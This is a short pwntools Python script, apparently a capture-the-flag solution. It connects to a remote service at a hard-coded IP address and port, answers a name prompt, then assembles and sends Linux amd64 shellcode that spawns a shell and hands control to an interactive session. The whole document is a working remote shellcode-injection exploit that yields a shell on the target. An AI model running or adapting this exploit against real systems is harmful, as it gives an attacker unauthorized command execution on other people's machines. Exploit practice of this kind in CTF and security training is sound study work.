from pwn import *

sh = remote("58.240.236.232",12001)

context(log_level="debug", os="linux", arch="amd64")
sh.recvuntil("name:")
sh.sendline("Lillian")
shellcode = asm(shellcraft.sh())
sh.recvuntil("shellcode:")

sh.sendline(shellcode)

sh.interactive()
